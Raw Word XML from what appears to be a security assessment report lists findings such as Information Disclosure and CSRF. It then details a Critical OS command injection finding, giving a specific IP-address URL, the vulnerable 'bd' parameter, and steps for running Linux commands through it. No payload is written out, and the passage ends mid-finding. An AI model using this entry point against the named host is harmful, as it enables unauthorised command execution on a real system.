                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidTr="00287724">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3764" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="00953B86">
            <w:pPr>
              <w:pStyle w:val="ListParagraph"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Information Disclosure</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1425" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="002D1253">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1455" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="002D1253">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1785" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="002A6DE1">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1545" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="002D1253">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1546" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="002D1253">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00F8662B" w:rsidRPr="00802CE3" w:rsidTr="00287724">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3764" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="00F8662B" w:rsidRDefault="00AB2226">
            <w:pPr>
              <w:pStyle w:val="ListParagraph"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Cross Site Request Forgery</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1425" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="00F8662B" w:rsidRPr="00802CE3" w:rsidRDefault="00F8662B">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1455" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="00F8662B" w:rsidRPr="00802CE3" w:rsidRDefault="00F8662B">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1785" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="00F8662B" w:rsidRDefault="00F8662B">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1545" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="00F8662B" w:rsidRPr="00802CE3" w:rsidRDefault="00F8662B">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1546" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="00F8662B" w:rsidRPr="00802CE3" w:rsidRDefault="00F8662B">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidTr="00287724">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3764" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="00F8662B">
            <w:pPr>
              <w:pStyle w:val="ListParagraph"/>
              <w:rPr>
                <w:b/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>Total Vulnerabilities = 9</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1425" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="002A6DE1">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:b/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>3</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1455" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="002A6DE1">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:b/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>3</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1785" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="00F8662B">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:b/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>3</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1545" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="0029303A">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:b/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:b/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>0</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1546" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="0029303A">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:b/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:b/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>0</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="002D1253">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="2860"/>
        </w:tabs>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00D43C03" w:rsidRPr="00802CE3" w:rsidRDefault="00D43C03">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="2860"/>
        </w:tabs>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="0062005A" w:rsidRPr="00802CE3" w:rsidRDefault="0062005A">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="2860"/>
        </w:tabs>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="0062005A" w:rsidRPr="00802CE3" w:rsidRDefault="0062005A">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="2860"/>
        </w:tabs>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="0062005A" w:rsidRPr="00802CE3" w:rsidRDefault="0062005A">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="2860"/>
        </w:tabs>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="0062005A" w:rsidRPr="00802CE3" w:rsidRDefault="0062005A">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="2860"/>
        </w:tabs>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="0062005A" w:rsidRPr="00802CE3" w:rsidRDefault="0062005A">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="2860"/>
        </w:tabs>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="0062005A" w:rsidRPr="00802CE3" w:rsidRDefault="0062005A">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="2860"/>
        </w:tabs>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="0062005A" w:rsidRPr="00802CE3" w:rsidRDefault="0062005A">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="2860"/>
        </w:tabs>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="0029303A" w:rsidP="00802CE3">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="2860"/>
        </w:tabs>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00802CE3">
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>4.  Vulnerability Details</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="002D1253">
      <w:pPr>
        <w:spacing w:line="145" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="1152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919"/>
        <w:gridCol w:w="1920"/>
        <w:gridCol w:w="1920"/>
        <w:gridCol w:w="1920"/>
        <w:gridCol w:w="1920"/>
        <w:gridCol w:w="1921"/>
      </w:tblGrid>
      <w:tr w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidTr="00942FF3">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1919" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="0029303A">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Vulnerability</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9601" w:type="dxa"/>
            <w:gridSpan w:val="5"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="0004341D" w:rsidP="006526E9">
            <w:pPr>
              <w:pStyle w:val="ListParagraph"/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>OS Command Injection</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidTr="00942FF3">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1919" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="00FB1D3F" w:rsidP="004E7688">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Risk Rating</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1920" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="00F50E3E">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Critical</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1920" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="0062005A" w:rsidP="0062005A">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Issue Count</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1920" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="0062005A">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1920" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="0062005A">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Source</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1921" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="0062005A">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Dynamic Manual Analysis</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="002267FB" w:rsidRPr="00802CE3" w:rsidTr="00942FF3">
        <w:trPr>
          <w:trHeight w:val="909"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="11520" w:type="dxa"/>
            <w:gridSpan w:val="6"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="002267FB" w:rsidRPr="00802CE3" w:rsidRDefault="0004341D" w:rsidP="0004341D">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="0004341D">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Command injection is an attack in which the goal is execution of arbitrary commands on the host operating system via a vulnerable application. Command injection attacks are possible when an application passes unsafe user supplied data (forms, cookies, HTTP headers etc.) to a system shell. In this attack, the attacker-supplied operating system commands are usually executed with the privileges of the vulnerable application. Command injection attacks are possible largely due to insufficient input validation.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="002267FB" w:rsidRPr="00802CE3" w:rsidTr="00942FF3">
        <w:trPr>
          <w:trHeight w:val="1165"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="11520" w:type="dxa"/>
            <w:gridSpan w:val="6"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="00BC0234" w:rsidRDefault="0004341D">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Instance1</w:t>
            </w:r>
            <w:r w:rsidR="00BC0234" w:rsidRPr="00802CE3">
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>:</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="0004341D" w:rsidRDefault="0004341D" w:rsidP="0004341D">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>URL</w:t>
            </w:r>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>:</w:t>
            </w:r>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t xml:space="preserve">  </w:t>
            </w:r>
            <w:r w:rsidRPr="00F2563F">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>http://52.23.185.72/65bd6d4a-0150-4ecd-9</w:t>
            </w:r>
            <w:r w:rsidR="00F2563F">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>8f3-7482692f7872/index.php?bd=</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="0004341D" w:rsidRDefault="0004341D" w:rsidP="0004341D">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="0004341D" w:rsidRPr="00802CE3" w:rsidRDefault="0004341D" w:rsidP="0004341D">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t xml:space="preserve">Vulnerable Parameter: </w:t>
            </w:r>
            <w:r w:rsidRPr="0004341D">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>bd</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00BC0234" w:rsidRPr="00802CE3" w:rsidRDefault="00BC0234" w:rsidP="00AA1885">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="00BC0234" w:rsidRPr="00802CE3" w:rsidRDefault="00BC0234">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="00FB1D3F" w:rsidRPr="00802CE3" w:rsidRDefault="00FB1D3F">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>S</w:t>
            </w:r>
            <w:r w:rsidR="00EF0F02">
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>teps</w:t>
            </w:r>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>:</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00FB1D3F" w:rsidRPr="00802CE3" w:rsidRDefault="00FB1D3F">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="00FB1D3F" w:rsidRPr="00802CE3" w:rsidRDefault="0004341D" w:rsidP="00FB1D3F">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>1. Navig</w:t>
            </w:r>
            <w:r w:rsidR="00EF0F02">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>ate to above URL and Enter any Linux OS</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t xml:space="preserve"> commands in the </w:t>
            </w:r>
            <w:r w:rsidRPr="00EF0F02">
              <w:rPr>
                <w:i/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>bd</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t xml:space="preserve"> parameter.</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00FB1D3F" w:rsidRPr="00802CE3" w:rsidRDefault="00D9541D" w:rsidP="005D5CF4">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>2. Observe the command results in the response</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00FB1D3F" w:rsidRPr="00802CE3" w:rsidRDefault="00FB1D3F" w:rsidP="005D5CF4">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
